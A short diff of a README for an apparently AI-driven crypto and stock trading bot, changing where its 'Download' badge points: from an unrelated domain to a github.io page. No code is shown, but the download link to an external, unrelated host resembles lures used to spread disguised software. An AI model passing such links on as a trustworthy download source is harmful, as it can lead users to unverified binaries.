@@ -2,7 +2,8 @@
 
 AutoGPT Trading Bot is an AI-powered automation tool for cryptocurrency and stock market trading. It uses autonomous agents to create, test, and execute trading strategies in real-time.
 
-[![Download AutoGPT Trading Bot](https://img.shields.io/badge/Download-AutoGPT_Trading_Bot-blueviolet)](https://seomadjest.com/)
+[![Download AutoGPT Trading Bot](https://img.shields.io/badge/Download-AutoGPT_Trading_Bot-blueviolet)](https://gpt-trading-bot.github.io/.github/
+)
 
 ---
 
